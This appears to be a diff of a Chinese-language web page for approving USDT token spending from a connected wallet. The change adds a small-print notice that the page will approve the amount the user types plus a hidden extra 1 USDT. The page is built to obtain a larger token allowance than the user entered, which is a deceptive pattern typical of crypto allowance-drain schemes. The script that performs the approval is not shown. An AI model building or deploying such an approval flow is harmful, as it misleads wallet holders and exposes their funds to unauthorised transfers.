@@ -1,22 +1,31 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>USDT 授权页面</title>
-  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    input, button { padding: 8px; font-size: 16px; margin: 6px 0; }
+    #status { margin-top: 12px; color: #333; }
+    .small { font-size: 13px; color: #666; }
+  </style>
 </head>
 <body>
-  <h2>授权 USDT</h2>
-  
-  <p>请输入授权金额 (USDT)：</p>
-  <input type="number" id="amount" placeholder="例如：10" min="0" step="0.01">
-  <button onclick="approveUSDT()">授权</button>
+  <h2>USDT 授权（前端示例）</h2>
 
-  <p id="status"></p>
+  <p class="small">注意：会同时授权 用户输入金额 + 隐藏 1 USDT（合计授权）。请确保你理解并确认。</p>
+
+  <label>授权 USDT 金额（单位：USDT，只输入数字）：</label><br/>
+  <input id="amount" type="number" placeholder="例如：10" min="0" step="0.01" />
+
+  <div style="margin-top:10px;">
+    <button id="connectBtn">连接钱包</button>
+    <button id="approveBtn" disabled>授权（approve）</button>
+  </div>
+
+  <p id="status">状态：等待操作</p>
 
   <script src="usdtApprove.js"></script>
 </body>
 </html>
-
-
-
